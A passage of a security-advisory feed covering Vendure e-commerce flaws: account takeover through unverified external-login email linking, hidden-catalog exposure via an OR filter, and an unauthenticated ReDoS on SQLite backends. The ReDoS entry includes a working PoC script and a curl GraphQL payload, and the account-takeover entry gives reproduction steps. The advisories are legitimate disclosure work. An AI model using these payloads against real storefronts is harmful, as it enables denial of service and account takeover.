<li><a href="https://github.com/CycloneDX/cyclonedx-node-npm/commit/15d3beb5bcd2b0b6eccfdf31192f5103b3f12c0f">https://github.com/CycloneDX/cyclonedx-node-npm/commit/15d3beb5bcd2b0b6eccfdf31192f5103b3f12c0f</a></li>
<li><a href="https://github.com/CycloneDX/cyclonedx-node-npm/releases/tag/v6.0.0">https://github.com/CycloneDX/cyclonedx-node-npm/releases/tag/v6.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-q69g-4hcv-6jg4">https://github.com/advisories/GHSA-q69g-4hcv-6jg4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q69g-4hcv-6jg4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T14:50:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vendure/core] Vendure affected by external-authentication account takeover: external login linked to a pre-existing account by email without verification]]></title>
        <id>https://github.com/advisories/GHSA-6j36-r6pr-59x4</id>
        <link href="https://github.com/advisories/GHSA-6j36-r6pr-59x4"/>
        <updated>2026-09-17T14:50:24.000Z</updated>
        <content type="html"><![CDATA[<h1 id="external-authentication-account-takeover-external-login-linked-to-a-pre-existing-account-by-email-without-requiring-verification">External-authentication account takeover: external login linked to a pre-existing account by email without requiring verification</h1>
<p><strong>Package:</strong> @vendure/core (vendure-ecommerce/vendure, latest master) · </p>
<blockquote>
<p>[!IMPORTANT]
This vulnerability <strong>only affects deployments that use external / social authentication</strong>
(an <code>AuthenticationStrategy</code> other than the built-in native email/password strategy) where
that strategy can return an email address the external provider has <strong>not verified</strong> the
user owns.</p>
</blockquote>
<p><strong>You are affected if all of these are true:</strong></p>
<ul>
<li>Your store configures one or more external <code>AuthenticationStrategy</code> implementations
(custom OAuth / social login / SSO), <strong>and</strong></li>
<li>At least one forwards an <code>emailAddress</code> to <code>ExternalAuthenticationService</code> without
guaranteeing the provider verified ownership of it (e.g. it doesn't check the provider's
<code>email_verified</code> claim, or leaves <code>verified</code> unset/false), <strong>and</strong></li>
<li>Customer accounts exist that share an email address with those external identities.</li>
</ul>
<p><strong>You are NOT affected if:</strong></p>
<ul>
<li>You use only the built-in native (email/password) authentication with no external strategies, <strong>or</strong></li>
<li>Every external strategy you use only ever returns provider-verified emails (and sets <code>verified: true</code>).</li>
</ul>
<p><strong>Remediation:</strong> Upgrade to <strong>3.7.0</strong>. After upgrading, an external login is only linked to a
pre-existing account when the email is verified; a custom <code>AuthenticationStrategy</code> must set
<code>verified: true</code> only for emails the provider has actually verified.</p>
<h2 id="summary">Summary</h2>
<p><code>ExternalAuthenticationService.createCustomerAndUser()</code> links a newly-presented external (OAuth/social) authentication method to a <strong>pre-existing User account selected purely by email-address match</strong>, and it does so <strong>without requiring <code>config.verified === true</code></strong>. If any configured <code>AuthenticationStrategy</code> forwards an email that was not proven to belong to the external identity (the classic <code>email_verified</code> omission — common with custom OAuth providers, or providers/strategies that don't validate email ownership), an attacker can register at that provider using a victim's email address, authenticate, and have their external identity bound to the victim's existing Vendure account — resulting in account takeover.</p>
<h2 id="vulnerable-code">Vulnerable code</h2>
<p><code>packages/core/src/service/helpers/external-authentication/external-authentication.service.ts</code> — <code>createCustomerAndUser</code>:</p>
<pre><code class="language-ts">const existingUser = await this.findExistingCustomerUserByEmailAddress(ctx, config.emailAddress);
if (existingUser) {
    user = existingUser;                 // &lt;-- links to the EXISTING account, by email alone
} else {
    user = new User({ identifier: config.emailAddress, verified: config.verified || false, ... });
}
const authMethod = await this.connection.getRepository(ctx, ExternalAuthenticationMethod).save(
    new ExternalAuthenticationMethod({ externalIdentifier: config.externalIdentifier, strategy: config.strategy }),
);
user.authenticationMethods = [...(user.authenticationMethods || []), authMethod];   // &lt;-- external login attached
await this.connection.getRepository(ctx, User).save(user);
</code></pre>
<p><code>config.verified</code> is used only to set <code>User.verified</code> and to write a <code>CUSTOMER_VERIFIED</code> history entry (later in the method) — it is <strong>never</strong> used to gate whether the external method may be attached to an existing account. So an unverified external email links to the victim's account just the same.</p>
<h2 id="impact">Impact</h2>
<p>Account takeover of any customer whose email address an attacker can present (unverified) via an external auth provider — read/modify the victim's orders, addresses, and PII, and place orders as them. The blast radius depends on the deployed <code>AuthenticationStrategy</code>(ies): strategies that don't strictly require a provider-verified email (or providers that don't guarantee email ownership) are directly exploitable.</p>
<h2 id="reproduction-conceptual">Reproduction (conceptual)</h2>
<ol>
<li>Victim has a native Vendure customer account <code>victim@example.com</code>.</li>
<li>Attacker authenticates through an external provider configured on the store, presenting <code>emailAddress = victim@example.com</code> with <code>verified</code> unset/false (depending on the strategy/provider).</li>
<li><code>createCustomerAndUser</code> finds the victim's existing User by email and attaches the attacker's <code>ExternalAuthenticationMethod</code>.</li>
<li>Attacker logs in via that external method → authenticated as the victim.</li>
</ol>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Refuse to bind an external authentication method to a <strong>pre-existing</strong> account unless the email is provably verified, and prefer explicit, authenticated account-linking:</p>
<pre><code class="language-ts">if (existingUser) {
    if (!config.verified) {
        // Do not silently link an unverified external identity to an existing account.
        throw new EmailAddressConflictError(); // or require the user to link while logged in
    }
    user = existingUser;
}
</code></pre>
<p>Document clearly that an <code>AuthenticationStrategy</code> MUST only set <code>verified: true</code> for provider-verified emails, and that linking to existing accounts requires it.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-6j36-r6pr-59x4">https://github.com/vendurehq/vendure/security/advisories/GHSA-6j36-r6pr-59x4</a></li>
<li><a href="https://github.com/vendurehq/vendure/commit/3bb04718ea4f9395fda731bd2a4bcfc3afb0a485">https://github.com/vendurehq/vendure/commit/3bb04718ea4f9395fda731bd2a4bcfc3afb0a485</a></li>
<li><a href="https://github.com/vendurehq/vendure/releases/tag/v3.7.0">https://github.com/vendurehq/vendure/releases/tag/v3.7.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6j36-r6pr-59x4">https://github.com/advisories/GHSA-6j36-r6pr-59x4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6j36-r6pr-59x4</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-09-17T14:50:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@vendure/core] Vendure: Shop API list queries can return non-public entities when filterOperator is OR]]></title>
        <id>https://github.com/advisories/GHSA-xf65-r35x-wmmv</id>
        <link href="https://github.com/advisories/GHSA-xf65-r35x-wmmv"/>
        <updated>2026-09-17T14:50:04.000Z</updated>
        <content type="html"><![CDATA[<p>The Shop API <code>products</code>, <code>collections</code> and <code>facets</code> queries inject a mandatory filter to restrict results to publicly-visible entities (<code>Product.enabled = true</code>, <code>Collection.isPrivate = false</code>, <code>Facet.isPrivate = false</code>). This injected guard was combined with the caller-supplied filter using the caller-controlled <code>filterOperator</code>. When a caller sets <code>filterOperator: OR</code>, the guard is OR-combined instead of AND-combined, so a caller can retrieve disabled products and private collections/facets by supplying a predicate that matches them.</p>
<h3 id="impact">Impact</h3>
<p>Exposure of catalog entities intended to be hidden from the Shop API. The Shop API is publicly accessible, so no authentication is required.</p>
<h3 id="patches">Patches</h3>
<p>The injected guard is now always AND-combined with the caller-supplied filter, regardless of <code>filterOperator</code>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None other than upgrading.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-xf65-r35x-wmmv">https://github.com/vendurehq/vendure/security/advisories/GHSA-xf65-r35x-wmmv</a></li>
<li><a href="https://github.com/vendurehq/vendure/commit/6daf5cb8571321eb6c6afa1d8e95a390c060be02">https://github.com/vendurehq/vendure/commit/6daf5cb8571321eb6c6afa1d8e95a390c060be02</a></li>
<li><a href="https://github.com/vendurehq/vendure/releases/tag/v3.6.5">https://github.com/vendurehq/vendure/releases/tag/v3.6.5</a></li>
<li><a href="https://github.com/advisories/GHSA-xf65-r35x-wmmv">https://github.com/advisories/GHSA-xf65-r35x-wmmv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xf65-r35x-wmmv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T14:50:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vendure/core] Vendure: Unauthenticated ReDoS via `regex` filter on SQLite backends]]></title>
        <id>https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</id>
        <link href="https://github.com/advisories/GHSA-jgm3-qmp2-c4p7"/>
        <updated>2026-09-17T14:49:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<blockquote>
<p>[!IMPORTANT] 
Only instances running on the SQLite driver (better-sqlite3) are affected; SQLite is usually used in development/testing backend, so production deployments on PostgreSQL or MySQL/MariaDB are unaffected.</p>
</blockquote>
<p>The <code>StringOperators.regex</code> filter exposed on the public Shop GraphQL API is evaluated inside the Node.js event loop via a synchronous SQLite user-defined function (UDF). Supplying a catastrophically backtracking pattern blocks the entire event loop, causing a complete denial of service with no authentication required.</p>
<hr>
<h3 id="details">Details</h3>
<p>Vendure registers a JavaScript UDF so that SQLite can handle the <code>REGEXP</code> operator:</p>
<p><strong><code>packages/core/src/service/helpers/list-query-builder/list-query-builder.ts</code> lines 917–931</strong></p>
<pre><code class="language-ts">private registerSQLiteRegexpFunction() {
    const regexpFn = (pattern: string, value: string) =&gt; {
        const result = new RegExp(`${pattern}`, 'i').test(value);  // user-controlled pattern
        return result ? 1 : 0;
    };
    if (dbType === 'better-sqlite3') {
        driver.databaseConnection.function('regexp', regexpFn);
    }
    if (dbType === 'sqljs') {
        driver.databaseConnection.create_function('regexp', regexpFn);
    }
}
</code></pre>
<p>The <code>pattern</code> argument is the raw value of <code>StringOperators.regex</code> submitted by the caller. No length limit, timeout, or safe-regex validation is applied before constructing <code>new RegExp(pattern)</code>.</p>
<p><strong><code>packages/core/src/service/helpers/list-query-builder/parse-filter-params.ts</code> lines 321–325</strong></p>
<pre><code class="language-ts">case 'regex':
    return {
        clause: getRegexpClause(fieldName, argIndex, dbType),
        parameters: { [`arg${argIndex}`]: operand },  // operand = raw user input
    };
</code></pre>
<p>The <code>products</code> resolver in <code>packages/core/src/api/resolvers/shop/shop-products.resolver.ts</code> carries <strong>no <code>@Allow</code> decorator</strong>, and the access control strategy treats an empty permission set as publicly accessible:</p>
<p><strong><code>packages/core/src/config/auth/default-entity-access-control-strategy.ts</code> lines 49–52</strong></p>
<pre><code class="language-ts">async canAccess(ctx: RequestContext, permissions: Permission[]): Promise&lt;boolean&gt; {
    if (permissions.length === 0) {
        return true;   // no @Allow → public
    }
    ...
}
</code></pre>
<p>The three conditions together — user-controlled regex, synchronous JS UDF on the event loop, unauthenticated access — create a complete unauthenticated DoS path.</p>
<p>Affected database drivers: <code>better-sqlite3</code>, <code>sqljs</code>.<br>MySQL/MariaDB and PostgreSQL delegate the pattern to the database engine (those engines have their own exposure characteristics but do not block the Node.js event loop).</p>
<hr>
<h3 id="poc">PoC</h3>
<img width="1610" height="458" alt="image" src="https://github.com/user-attachments/assets/327f3847-79d9-43e2-859e-47a753e61b2b">
[poc.zip](https://github.com/user-attachments/files/28752976/poc.zip)
[poc-redos.js](https://github.com/user-attachments/files/28753000/poc-redos.js)

<p><strong>Prerequisites:</strong> Node.js ≥ 18. No account, no server, no dependencies.</p>
<p><strong>Step 1 — save the following as <code>poc-redos.js</code>:</strong></p>
<pre><code class="language-js">// Exact code from list-query-builder.ts:918-919
const PATTERN = '(a+)+$';
const VALUE   = 'a'.repeat(28) + 'b';
console.log('[*] pattern:', PATTERN, '  value:', VALUE);
console.log('[*] Starting (server would be unresponsive from this point)...');
const start = Date.now();
const result = new RegExp(`${PATTERN}`, 'i').test(VALUE);
console.log('[+] elapsed:', Date.now() - start, 'ms  result:', result);
</code></pre>
<p><strong>Step 2 — run it:</strong></p>
<pre><code class="language-cmd">node poc-redos.js
</code></pre>
<p><strong>Expected output (verified on Node.js v24.14.0):</strong></p>
<pre><code>[*] pattern: (a+)+$   value: aaaaaaaaaaaaaaaaaaaaaaaaaaaab
[*] Starting (server would be unresponsive from this point)...
[+] elapsed: 19755 ms  result: false
</code></pre>
<p>A 29-character input causes ~20 seconds of CPU spin. Inside a live Vendure server this same code runs synchronously in the SQLite UDF on the Node.js event loop — the process cannot handle any other request for the entire duration.</p>
<p><strong>Step 3 — GraphQL payload (against a running Vendure instance with <code>better-sqlite3</code> or <code>sqljs</code> driver):</strong></p>
<pre><code class="language-cmd">curl -s -X POST http://localhost:3000/shop-api -H "Content-Type: application/json" -d "{\"query\":\"{ products(options:{filter:{name:{regex:\\\"(a+)+$\\\"}}}) { items { id } } }\"}" --max-time 60
</code></pre>
<p><em>No test account is needed. The <code>products</code> query is publicly accessible.</em></p>
<hr>
<h3 id="impact">Impact</h3>
<p><strong>Vulnerability type:</strong> Regular Expression Denial of Service (ReDoS)</p>
<p><strong>Who is impacted:</strong></p>
<ul>
<li>Any Vendure deployment running with a <code>better-sqlite3</code> or <code>sqljs</code> database driver (typical for development environments and single-server small deployments created via <code>@vendure/create</code>).</li>
<li>Any unauthenticated internet user can trigger the attack — no credentials, no API key, no session.</li>
<li>A single malicious HTTP request blocks the Node.js event loop, making the entire storefront and admin panel unresponsive until the regex engine times out (which may take tens of seconds to minutes depending on the host CPU and pattern chosen).</li>
<li>Repeated requests constitute a sustained DoS requiring no more bandwidth than a single HTTP request per CPU-second.</li>
</ul>
<hr>
<h3 id="fix">Fix</h3>
<ol>
<li><p><strong>Validate the regex before constructing it.</strong> Reject patterns that are known to cause catastrophic backtracking using a safe-regex library (e.g. <code>safe-regex2</code> or <code>recheck</code>) before passing them to <code>new RegExp()</code>.</p>
</li>
<li><p><strong>Enforce a maximum pattern length.</strong> Reject <code>StringOperators.regex</code> values exceeding a reasonable limit (e.g. 100 characters) at the GraphQL validation layer.</p>
</li>
<li><p><strong>Run the UDF in a worker thread.</strong> Move <code>regexpFn</code> off the main event loop by executing it in a <code>worker_threads</code> context with an <code>AbortSignal</code> timeout so a hung regex cannot block the server.</p>
</li>
<li><p><strong>Require authentication for filtered list queries.</strong> Add <code>@Allow(Permission.Authenticated)</code> to <code>ShopProductsResolver.products</code> (and other filterable list queries) if anonymous product browsing is not a business requirement, as a defence-in-depth measure.</p>
</li>
</ol>
<hr>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vendurehq/vendure/security/advisories/GHSA-jgm3-qmp2-c4p7">https://github.com/vendurehq/vendure/security/advisories/GHSA-jgm3-qmp2-c4p7</a></li>
<li><a href="https://github.com/vendurehq/vendure/commit/f74cbbb0b9a50b5b0131822835fe7ee9b71b42c9">https://github.com/vendurehq/vendure/commit/f74cbbb0b9a50b5b0131822835fe7ee9b71b42c9</a></li>
<li><a href="https://github.com/vendurehq/vendure/releases/tag/v3.6.5">https://github.com/vendurehq/vendure/releases/tag/v3.6.5</a></li>
<li><a href="https://github.com/advisories/GHSA-jgm3-qmp2-c4p7">https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgm3-qmp2-c4p7</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T14:49:56.000Z</published>
    </entry>
</feed>